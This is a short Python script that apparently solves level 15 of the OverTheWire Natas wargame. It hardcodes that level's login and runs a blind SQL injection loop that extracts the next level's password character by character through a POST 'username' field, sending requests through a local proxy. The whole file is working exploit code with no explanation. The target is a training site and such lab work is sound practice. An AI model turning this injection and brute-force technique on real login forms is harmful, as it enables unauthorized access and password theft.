import natas, requests

URL = 'http://natas15.natas.labs.overthewire.org/index.php'
USER = 'natas15'
PASS = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)
header = {"Content-Type": "application/x-www-form-urlencoded"}
proxy = {"http":"http://127.0.0.1:8080"}

alfabeto = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'

passwd = ''
counter = 0
for req in range(32):
    for c in alfabeto:
        payload = f"username=natas16%22%20AND%20password%20like%20binary%20'{passwd+c}%25'#--%20-"
        post = requests.post(url=URL, auth=auth_basic, headers=header, data=payload, proxies=proxy)
        counter = counter+1
        response_http = post.text
        if "This user exists." in response_http:
            passwd = passwd + c
            print(f'pass is {passwd}')
            break